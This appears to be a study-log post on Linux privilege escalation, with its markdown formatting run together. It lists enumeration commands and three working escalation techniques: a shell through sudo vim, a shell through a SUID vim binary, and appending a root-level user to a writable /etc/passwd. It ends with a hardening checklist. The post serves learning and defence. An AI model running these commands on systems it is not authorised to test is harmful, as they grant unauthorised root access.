## 🗓️ Day 36/100 – Linux Privilege Escalation

**Focus:** Enumerating misconfigurations to gain root access from standard user.

### 🔍 Enumeration Commands

**1. User Context**
```bash
whoami                    # Current user
id                        # UID, GID, groups  
groups                    # Group memberships
sudo -l                   # Sudo privileges2. SUID/SGID Hunting# SUID files (run as owner)
find / -perm -4000 -type f 2>/dev/null 2>&1
find / -perm -u=s 2>/dev/null 2>&1

# Capabilities (modern alternative to SUID)
getcap -r / 2>/dev/null3. System Enumeration# Cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Writable files
find /etc -writable 2>/dev/null
find / -writable -type d 2>/dev/null⚔️ Common Escalation Paths1. Sudo Misuse$ sudo -l
User hacker may run: (root) NOPASSWD: /usr/bin/vim
$ sudo vim
# Inside vim: :shell    OR    :w !sh2. SUID Exploitation$ find / -perm -4000 2>/dev/null
/usr/bin/vim
$ vim -c ':!/bin/sh'3. Writable /etc/passwdecho 'hacker2:$6$abc123::0:0:Hacker:/root:/bin/bash' >> /etc/passwd
su hacker2🛡️ Hardening ChecklistRemove unnecessary SUID bitsRestrict sudo commandsMonitor cron jobs and scheduled tasksFile integrity monitoring on /etc
